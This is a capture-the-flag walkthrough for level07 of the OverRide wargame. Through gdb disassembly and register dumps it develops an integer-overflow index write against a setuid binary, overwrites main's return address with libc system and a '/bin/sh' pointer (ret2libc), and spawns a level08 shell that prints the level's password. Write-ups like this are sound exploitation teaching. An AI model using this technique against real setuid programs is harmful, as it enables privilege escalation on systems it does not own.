# Walkthrough

## Context

### Binary info

```bash
level07@OverRide:~$ ls -l
total 12
-rwsr-s---+ 1 level08 users 11744 Sep 10  2016 level07
level07@OverRide:~$ file level07
level07: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf5b46cdb878d5a3929cc27efbda825294de5661e, not stripped
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 3
 Index: 0
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
Input command: store
 Number: 3
 Index: 1
 Completed store command successfully
Input command: read
 Index: 1
 Number at data[1] is 3
 Completed read command successfully
Input command: quit
```

An elf binary compiled for Intel 80386 arch with level08's privileges

### Functions

```assembly
(gdb) info functions
All defined functions:

Non-debugging symbols:
...
0x080485c4  clear_stdin
0x080485e7  get_unum
0x0804861f  prog_timeout
0x08048630  store_number
0x080486d7  read_number
0x08048723  main
...
```

### Variables

```assembly
(gdb) info variables
All defined variables:

Non-debugging symbols:
...
```

No global variables

### Disassembly

Please refer to the [assembly.asm](./Resources/assembly.asm) and [source.c](./source.c) for better understanding

#### 'main'

```assembly
(gdb) disas main
Dump of assembler code for function main:
...
   0x08048729 <+6>:     and    $0xfffffff0,%esp
   0x0804872c <+9>:     sub    $0x1d0,%esp
...
   0x08048791 <+110>:   lea    0x24(%esp),%ebx
...
   0x080488ea <+455>:   call   0x8048630 <store_number>
...
End of assembler dump.
```

We will be using 'store_number' function to overwrite 'main' ret.

#### 'store_number'

```assembly
(gdb) disas store_number
Dump of assembler code for function store_number:
...
   0x08048633 <+3>:     sub    $0x28,%esp
...
   0x08048651 <+33>:    call   0x80485e7 <get_unum>
   0x08048656 <+38>:    mov    %eax,-0x10(%ebp)
...
   0x08048666 <+54>:    call   0x80485e7 <get_unum>
   0x0804866b <+59>:    mov    %eax,-0xc(%ebp)
...
   0x08048686 <+86>:    test   %edx,%edx
   0x08048688 <+88>:    je     0x8048697 <store_number+103>
...
   0x08048690 <+96>:    cmp    $0xb7,%eax
   0x08048695 <+101>:   jne    0x80486c2 <store_number+146>
...
   0x080486c2 <+146>:   mov    -0xc(%ebp),%eax
   0x080486c5 <+149>:   shl    $0x2,%eax
   0x080486c8 <+152>:   add    0x8(%ebp),%eax
   0x080486cb <+155>:   mov    -0x10(%ebp),%edx
   0x080486ce <+158>:   mov    %edx,(%eax)
   0x080486d0 <+160>:   mov    $0x0,%eax
   0x080486d5 <+165>:   leave
   0x080486d6 <+166>:   ret
End of assembler dump.
```

This function is our target, as it will use our input number as index to buffer

#### 'get_enum'

```assembly
(gdb) disas get_unum
Dump of assembler code for function get_unum:
...
   0x08048606 <+31>:    lea    -0xc(%ebp),%edx
...
   0x08048610 <+41>:    call   0x8048500 <__isoc99_scanf@plt>
...
   0x0804861a <+51>:    mov    -0xc(%ebp),%eax
...
End of assembler dump.
```

This function returns our input number in %eax register

## Exploit

We've discovered that with some conditions the store_number function will use our input number as an index to the passed buffer. Firstly we will compute an offset to the ret of 'main' and then we will find such a number that, multiplied by 4, will be equal to this offset and it must pass the conditions(not being divisible by 3). Then we will be using the ret2libc attack to replace ret with libc 'system' addres with /bin/sh argument

### Calculating offset

```bash
(gdb) break *0x08048732
Breakpoint 1 at 0x8048732
(gdb) run
Starting program: /home/users/level07/level07

Breakpoint 1, 0x08048732 in main ()
(gdb) i r
eax            0x1      1
ecx            0xffffd7a4       -10332
edx            0xffffd734       -10444
ebx            0xf7fceff4       -134418444
esp            0xffffd520       0xffffd520
ebp            0xffffd708       0xffffd708
esi            0x0      0
edi            0x0      0
eip            0x8048732        0x8048732 <main+15>
eflags         0x282    [ SF IF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99
```

We substract $ebp from $esp and - 4 bytes(ebp itself) - 0x24(buffer start) to get our offset

0xffffd708 - (0xffffd520 - 0x24) - 0x4 == 456

Also we need to divide by 4 because it is an int buffer

So the offset is 456 / 4 = 114

### Finding suitable number

So we need a number that is not divisible by 3 and when multiplied by 4 it must be equal to 114. We're going to use an int overflow to accomplish that

By trial an error we found such a number - 2147483762. 2147483762 + 2 is not divisible by 3 too for our /bin/sh argument


### Search for ret2libc addresses

```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
```

We found 'system' address along with the /bin/sh string address

```python
>>> print(0xf7e6aed0)
4159090384
>>> print(0xf7f897ec)
4160264172
```

### Getting .pass

```bash
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 2147483762
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 2147483764
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```